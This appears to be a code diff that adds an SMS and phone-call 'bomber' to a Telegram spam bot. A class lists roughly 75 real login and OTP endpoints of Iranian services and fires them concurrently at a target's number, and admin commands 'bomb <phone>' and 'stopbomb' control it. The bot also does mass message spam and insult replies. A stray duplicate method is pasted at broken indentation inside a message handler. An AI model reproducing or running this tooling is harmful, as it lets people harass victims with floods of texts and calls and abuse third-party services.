@@ -3,7 +3,10 @@ import random
 import time
 import os
 import re
+import requests
 from typing import Set, List, Optional, Dict
+import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from telethon import TelegramClient, events
 from telethon.tl.types import Message, User
@@ -14,6 +17,8 @@ from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.types import InputPhoto
 from telethon.errors import FloodWaitError, UserAlreadyParticipantError
 from typing import List
+from telegram import Update
+from telegram.ext import ContextTypes
 
 # API Credentials (REQUIRED even for bot tokens)
 API_ID = 22152659
@@ -74,6 +79,231 @@ FORWARD_SPAM_TASK = None
 
 # Per-bot spam states
 bot_spam_states: Dict[int, Dict] = {}
+# Add these global variables
+BOMBER_RUNNING = False
+BOMBER_TASK = None
+class SMSBomber:
+    def __init__(self):
+        self.session = requests.Session()
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ]
+        self.results = {"success": 0, "failed": 0, "details": []}
+        self.stop_flag = False
+
+    def stop(self):
+        """Stop the active bomber run."""
+        self.stop_flag = True
+        print("[BOMBER] Stop signal received")
+        return True
+
+    def get_user_agent(self):
+        return random.choice(self.user_agents)
+
+    def replace_placeholders(self, template, phone_number):
+        if template is None:
+            return ""
+        result = str(template).replace("{{num}}", phone_number)
+        result = result.replace("{{user_agent}}", self.get_user_agent())
+        result = result.replace("{{random}}", str(random.randint(1000, 9999)))
+        return result
+
+    def send_request(self, request_config, phone_number):
+        if self.stop_flag:
+            service_name = request_config.get("URL", "stopped")
+            service_name = service_name.split("//")[-1].split("/")[0] if "//" in service_name else service_name
+            return {
+                "success": False,
+                "status_code": 0,
+                "service": service_name,
+                "type": request_config.get("Type", "sms"),
+                "stopped": True,
+            }
+
+        try:
+            url = self.replace_placeholders(request_config["URL"], phone_number)
+            method = request_config.get("Method", "GET")
+            headers = request_config.get("Headers", {})
+            payload = request_config.get("Payload", {})
+
+            processed_headers = {}
+            for key, value in headers.items():
+                processed_headers[key] = self.replace_placeholders(value, phone_number)
+
+            processed_payload = {}
+            if payload and isinstance(payload, dict):
+                for key, value in payload.items():
+                    processed_payload[key] = self.replace_placeholders(value, phone_number)
+
+            response = None
+            timeout = 15
+
+            if method.upper() == "POST":
+                if processed_headers.get("content-type", "").startswith("application/json"):
+                    response = self.session.post(url, json=processed_payload, headers=processed_headers, timeout=timeout, verify=False)
+                else:
+                    response = self.session.post(url, data=processed_payload, headers=processed_headers, timeout=timeout, verify=False)
+            elif method.upper() == "GET":
+                response = self.session.get(url, headers=processed_headers, params=processed_payload, timeout=timeout, verify=False)
+
+            service_name = url.split("//")[-1].split("/")[0] if "//" in url else url
+            if response:
+                success = response.status_code in [200, 201, 202, 204]
+                return {
+                    "success": success,
+                    "status_code": response.status_code,
+                    "service": service_name,
+                    "type": request_config.get("Type", "sms")
+                }
+            return {
+                "success": False,
+                "status_code": 0,
+                "service": service_name,
+                "type": request_config.get("Type", "sms")
+            }
+        except Exception as e:
+            service_name = request_config["URL"].split("//")[-1].split("/")[0] if "//" in request_config["URL"] else request_config["URL"]
+            return {
+                "success": False,
+                "error": str(e),
+                "service": service_name,
+                "type": request_config.get("Type", "sms")
+            }
+
+    def get_all_apis(self):
+        apis = [
+            {"Type": "sms", "Request": {"URL": "https://api.tapsi.food/v1/api/Authentication/otp", "Method": "POST", "Payload": {"cellPhone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pmxchange.co/api/User/Login/SendCode", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}", "forPasswordCheck": True}}},
+            {"Type": "sms", "Request": {"URL": "https://api.bimesho.com/api/v1/auth/otp/send", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.azkivam.com/auth/login", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.komodaa.com/api/v2.6/loginRC/request", "Method": "POST", "Payload": {"phone_number": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://tabdil24.net/api/api/v1/auth/login-register", "Method": "POST", "Payload": {"emailOrMobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://roshapharmacy.com/signin?user_mobile=0{{num}}&confirm_code=&popup=1&signin=1", "Method": "POST"}},
+            {"Type": "sms", "Request": {"URL": "https://www.vitrin.shop/api/v1/user/request_code", "Method": "POST", "Payload": {"phone_number": "0{{num}}", "forgot_password": False}}},
+            {"Type": "sms", "Request": {"URL": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "Method": "POST", "Payload": {"cellphone": "+98{{num}}"}, "Headers": {"content-type": "application/json"}}},
+            {"Type": "sms", "Request": {"URL": "https://tap33.me/api/v2/user", "Method": "POST", "Payload": {"credential": {"phoneNumber": "0{{num}}", "role": "PASSENGER"}}}},
+            {"Type": "sms", "Request": {"URL": "https://api.torob.com/a/phone/send-pin/?phone_number=0{{num}}", "Method": "GET"}},
+            {"Type": "sms", "Request": {"URL": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://account.api.balad.ir/api/web/auth/login/", "Method": "POST", "Payload": {"phone_number": "0{{num}}", "os_type": "W"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.ostadkr.com/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "Method": "POST", "Payload": {"mobile": "0{{num}}", "contry_code": "98"}}},
+            {"Type": "sms", "Request": {"URL": "https://drdr.ir/api/v3/auth/login/mobile/init/", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "Method": "POST", "Payload": {"mobile": "0{{num}}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}}},
+            {"Type": "sms", "Request": {"URL": "https://mobapi.banimode.com/api/v2/auth/request", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.beroozmart.com/api/pub/account/send-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}", "sendViaSms": True}}},
+            {"Type": "sms", "Request": {"URL": "https://app.itoll.com/api/v1/auth/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://core.gap.im/v1/user/add.json?mobile=%2B98{{num}}", "Method": "GET"}},
+            {"Type": "sms", "Request": {"URL": "https://pinket.com/api/cu/v2/phone-verification", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pinorest.com/frontend/auth/login/mobile", "Method": "POST", "Payload": {"mobile": "{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{{num}}&source=2&sendTokenIfNot=true", "Method": "GET"}},
+            {"Type": "sms", "Request": {"URL": "https://api.lendo.ir/api/customer/auth/send-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://gw.taaghche.com/v4/site/auth/login", "Method": "POST", "Payload": {"contact": "0{{num}}", "forceOtp": False}}},
+            {"Type": "sms", "Request": {"URL": "https://fidibo.com/user/login-by-sms", "Method": "POST", "Payload": {"mobile_number": "{{num}}", "country_code": "ir"}}},
+            {"Type": "sms", "Request": {"URL": "https://khodro45.com/api/v1/customers/otp/", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pateh.com/ath/auth/login-or-register", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "Method": "POST", "Payload": {"auth": {"phoneNumber": "0{{num}}"}}}},
+            {"Type": "sms", "Request": {"URL": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}", "isResend": False}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pindo.ir/v1/user/login-register/", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.delino.com/user/register", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.kukala.ir/api/user/Otp", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.buskool.com/send_verification_code", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://3tex.io/api/1/users/validation/mobile", "Method": "POST", "Payload": {"receptorPhone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://deniizshop.com/api/v1/sessions/login_request", "Method": "POST", "Payload": {"mobile_number": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://flightio.com/bff/Authentication/CheckUserKey", "Method": "POST", "Payload": {"userKey": "98-{{num}}", "userKeyType": 1}}},
+            {"Type": "sms", "Request": {"URL": "https://abantether.com/users/register/phone/send/", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pooleno.ir/v1/auth/check-mobile", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://nx.classino.com/otp/v1/api/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418", "Method": "POST", "Payload": {"cellphone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.bahramshop.ir/api/user/validate/username", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "Method": "POST", "Payload": {"userName": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}", "country_code": "+98"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "Method": "POST", "Payload": {"UserName": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://a4baz.com/api/web/login", "Method": "POST", "Payload": {"cellphone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.anargift.com/api/people/auth", "Method": "POST", "Payload": {"user": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://nobat.ir/api/public/patient/login/phone", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.riiha.ir/api/v1.0/authenticate", "Method": "POST", "Payload": {"mobile": "0{{num}}", "type": "mobile"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.mohit.online/api/auth/login", "Method": "POST", "Payload": {"username": "0{{num}}", "app": "market"}}},
+            {"Type": "sms", "Request": {"URL": "https://auth.mrbilit.ir/api/Token/send?mobile=0{{num}}", "Method": "GET"}},
+            {"Type": "sms", "Request": {"URL": "https://www.sheypoor.com/api/v10.0.0/auth/send", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.simkhanapi.ir/api/users/registerV2", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.digikala.com/v1/user/authenticate/", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://tikban.com/Account/LoginAndRegister", "Method": "POST", "Payload": {"cellPhone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://dicardo.com/main/sendsms", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.digistyle.com/users/login-register/", "Method": "POST", "Payload": {"loginRegister[email_phone]": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://banankala.com/home/login", "Method": "POST", "Payload": {"Mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://shahrfarsh.com/Account/Login", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://rojashop.com/api/auth/sendOtp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://dadpardaz.com/advice/getLoginConfirmationCode", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.rokla.ir/api/request/otp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.pezeshket.com/core/v1/auth/requestCode", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://virgool.io/api/v1.4/auth/verify", "Method": "POST", "Payload": {"method": "phone", "identifier": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://api.timcheh.com/auth/otp/send", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://bimebazar.com/accounts/api/login_sec/", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
+            {"Type": "sms", "Request": {"URL": "https://safarmarket.com//api/security/v2/user/otp", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
+            {"Type": "call", "Request": {"URL": "https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{{num}}", "Method": "GET"}},
+            {"Type": "call", "Request": {"URL": "https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{{num}}&type=IVR", "Method": "GET"}},
+            {"Type": "call", "Request": {"URL": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{{num}}", "Method": "GET"}}
+        ]
+        return apis
+
+    def run_attack(self, phone_number, attack_type="all", max_workers=20):
+        self.stop_flag = False
+        all_apis = self.get_all_apis()
+
+        if attack_type == "sms":
+            apis_to_use = [api for api in all_apis if api["Type"] == "sms"]
+        elif attack_type == "call":
+            apis_to_use = [api for api in all_apis if api["Type"] == "call"]
+        else:
+            apis_to_use = all_apis
+
+        success_count = 0
+        failed_count = 0
+        details = []
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            future_to_config = {
+                executor.submit(self.send_request, api["Request"], phone_number): api
+                for api in apis_to_use
+            }
+
+            for future in as_completed(future_to_config):
+                if self.stop_flag:
+                    break
+                api = future_to_config[future]
+                try:
+                    result = future.result()
+                    if result.get("stopped"):
+                        failed_count += 1
+                        details.append(f" {result['type'].upper()} → {result['service']} [STOPPED]")
+                    elif result["success"]:
+                        success_count += 1
+                        details.append(f" {result['type'].upper()} → {result['service']}")
+                    else:
+                        failed_count += 1
+                        details.append(f" {result['type'].upper()} → {result['service']}")
+                except Exception as e:
+                    failed_count += 1
+                    details.append(f" Error: {str(e)[:30]}")
+
+        return {
+            "success": success_count,
+            "failed": failed_count,
+            "total": success_count + failed_count,
+            "details": details[:10]
+        }
+
+
+bomber_instance = SMSBomber()
 
 
 def is_admin(user_id: int) -> bool:
@@ -89,7 +319,7 @@ async def spam_loop_all_bots(target, text, speed):
                 break
             try:
                 await client.send_message(target, text)
-                print(f"[SPAM] Bot {i} Sent to {target}")
+                print(f"spam{i} Sent to {target}")
             except FloodWaitError as e:
                 print(f"[SPAM] Bot {i} Flood wait: {e.seconds}s")
                 await asyncio.sleep(e.seconds)
@@ -372,6 +602,65 @@ async def handle_all_messages(event):
     raw_text = event.message.text.strip() if event.message.text else ""
     text = raw_text.lower()
 
+    if text == "stopbomb":
+        if user_id not in ADMIN_IDS:
+            return
+        bomber_instance.stop()
+        await event.reply(" attck stop ")
+        return
+
+    if text.startswith("bomb"):
+        if user_id not in ADMIN_IDS:
+            return
+
+        parts = raw_text.split()
+        if len(parts) < 2:
+            await event.reply(
+                " *SMS/CALL BOMBER*\n\n"
+                "Usage: `bomb <phone>` - SMS only\n"
+                "`bomb <phone> all` - Both SMS and Call\n"
+                "`bomb <phone> call` - Call only\n\n"
+                "*Example:* `bomb 9123456789 all`\n\n"
+                "Developer by @DevilWillCryBitch",
+                parse_mode='Markdown'
+            )
+            return
+
+        phone = parts[1].strip()
+        attack_type = "sms"
+
+        if len(parts) > 2:
+            attack_type = parts[2].lower()
+            if attack_type not in ["sms", "call", "all"]:
+                attack_type = "sms"
+
+        if not phone.isdigit() or len(phone) != 10:
+            await event.reply(
+                " Invalid phone number Enter without 0. Example: `9123456789` or make sure number is right ",
+                parse_mode='Markdown'
+            )
+            return
+
+        await event.reply(
+            f" sms attck start  `0{phone}`\n"
+            f"use stopbomb for stop it if u want ",
+            parse_mode='Markdown'
+        )
+
+        try:
+            loop = asyncio.get_event_loop()
+            result = await loop.run_in_executor(None, bomber_instance.run_attack, phone, attack_type, 20)
+
+            message = "COMPLETE\n\n"
+            message += f" Target: `0{phone}`\n"
+            message += f" Successful: {result['success']}\n"
+            message += f" developer by @DevilWillCryBitch\n"
+
+            await event.reply(message, parse_mode='Markdown')
+        except Exception as e:
+            await event.reply(f" Error: {str(e)}")
+        return
+
     if event.is_reply and raw_text:
         if user_id in ADMIN_IDS:
             if not text.startswith((
@@ -380,7 +669,7 @@ async def handle_all_messages(event):
                 "setfwd_pos ", "fspam_on", "fspam_off", "showfwd", "join ",
                 "addfosh", "listfosh", "removefosh ", "setenemy", "enemyoff", "setreply ",
                 "copy ", "back", "ping", "status", "sudo su", "kiladmin",
-                "bitch ", "time ", "start", "stop", "set "
+                "bitch ", "time ", "start", "stop", "stopbomb", "set "
             )):
                 trailing_match = re.match(r"^(.*?)(?:\s+)?(\d+)\s*$", raw_text)
                 if trailing_match:
@@ -395,6 +684,12 @@ async def handle_all_messages(event):
                         except Exception as e:
                             print(f"[ERROR] Repeat reply failed: {e}")
                         return
+                    # Add this method at the end of SMSBomber class (before the class ends):
+    def stop(self):
+        """Stop the bomber"""
+        self.stop_flag = True
+        print("[BOMBER] Stop signal received")
+        return True
     
     me = await client_instance.get_me()
 
@@ -417,6 +712,8 @@ async def handle_all_messages(event):
     if text == "help" or text == "راهنما":
         await send_loading_animation(event)
         help_text = """
+```
+        𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈
 > spam - Start spam 
 > spamoff - Stop spam 
 > setfosh <text> - 
@@ -427,7 +724,7 @@ async def handle_all_messages(event):
 > ping - Check bot ping
 > status - Show status
 > help2
-> Development by @DevilWillCryBitch
+> Development by @DevilWillCryBitch```
 """
         try:
             await client_instance.send_file(
@@ -447,9 +744,12 @@ async def handle_all_messages(event):
     if text == "help2":
         await send_loading_animation(event)
         help_text = """
+```
+        𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈
+
 > sudo su <user id> - Add admin 
 > kiladmin <user id> - Remove admin
-> copy @user - Clone profile
+> copy @user - copy profile
 > back - Restore original profile
 > on - Start number fight 
 > off - Stop number fight 
@@ -463,7 +763,9 @@ async def handle_all_messages(event):
 > time <seconds> - Set delay (1-60s)
 > start - spam with your chose id  
 > stop - Stop (start)
-> Development by @DevilWillCryBitch
+> bomb <phone> - sms attck and call attck 
+> stop bomb - Stop attck
+> Development by @DevilWillCryBitch```
 """
         try:
             await client_instance.send_file(
